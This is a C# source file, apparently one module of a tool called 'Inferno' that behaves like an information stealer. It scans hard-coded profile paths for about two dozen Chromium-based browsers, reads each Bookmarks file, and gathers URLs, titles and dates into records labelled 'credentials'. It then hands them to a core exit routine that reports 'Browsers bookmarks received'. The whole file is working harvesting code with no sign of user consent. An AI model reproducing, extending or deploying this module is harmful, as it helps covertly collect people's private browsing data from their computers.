﻿using System;
using System.Collections.Generic;
using System.IO;

namespace Inferno
{
    class Bookmarks
    {
        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        // Return list with arrays (url, name, date)
        public static void get()
        {
            // Path info
            string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string u_s = "\\User Data\\Default\\Bookmarks";
            // Browsers list
            string[] chromiumBasedBrowsers = new string[]
            {
                l_a + "Google\\Chrome" + u_s,
                l_a + "Google(x86)\\Chrome" + u_s,
                l_a + "Chromium" + u_s,
                a_a + "Opera Software\\Opera Stable\\Bookmarks",
                l_a + "BraveSoftware\\Brave-Browser" + u_s,
                l_a + "Epic Privacy Browser" + u_s,
                l_a + "Amigo" + u_s,
                l_a + "Vivaldi" + u_s,
                l_a + "Orbitum" + u_s,
                l_a + "Mail.Ru\\Atom" + u_s,
                l_a + "Kometa" + u_s,
                l_a + "Comodo\\Dragon" + u_s,
                l_a + "Torch" + u_s,
                l_a + "Comodo" + u_s,
                l_a + "Slimjet" + u_s,
                l_a + "360Browser\\Browser" + u_s,
                l_a + "Maxthon3" + u_s,
                l_a + "K-Melon" + u_s,
                l_a + "Sputnik\\Sputnik" + u_s,
                l_a + "Nichrome" + u_s,
                l_a + "CocCoc\\Browser" + u_s,
                l_a + "uCozMedia\\Uran" + u_s,
                l_a + "Chromodo" + u_s,
                l_a + "Yandex\\YandexBrowser" + u_s
            };

            List<Dictionary<string, string>> bookmarks = new List<Dictionary<string, string>>();

            // Search all browsers
            foreach (string browser in chromiumBasedBrowsers)
            {
                if (!File.Exists(browser)) { 
                    continue;
                }


                string bookmarksFile = File.ReadAllText(browser);
                foreach (var mark in Newtonsoft.Json.Linq.JObject.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                {
                    Dictionary<string, string> credentials = new Dictionary<string, string>
                    {
                        ["url"] = (string)mark["url"],
                        ["name"] = (string)mark["name"],
                        ["date_added"] = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(mark["date_added"])), TimeZoneInfo.Local))
                    };
                    bookmarks.Add(credentials);
                }
         
                continue;
            }

            output.bookmarks = bookmarks;
            core.Exit("Browsers bookmarks received", output);
        }
    }
}
